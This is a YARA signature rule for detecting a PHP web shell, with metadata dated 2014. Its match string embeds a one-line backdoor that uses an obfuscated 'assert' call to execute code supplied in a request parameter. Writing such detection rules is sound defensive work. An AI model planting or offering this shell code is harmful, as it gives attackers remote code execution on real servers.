rule webshell_webshells_new_xxx {
  meta:
    author = "Spider"
    comment = "None"
    date = "2014/03/28"
    description = "Web shells - generated from file xxx.php"
    family = "None"
    hacker = "None"
    hash = "0e71428fe68b39b70adb6aeedf260ca0"
    judge = "black"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "None"
    score = 70
    threatname = "None"
    threattype = "None"
  strings:
    $s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword
  condition:
    all of them
}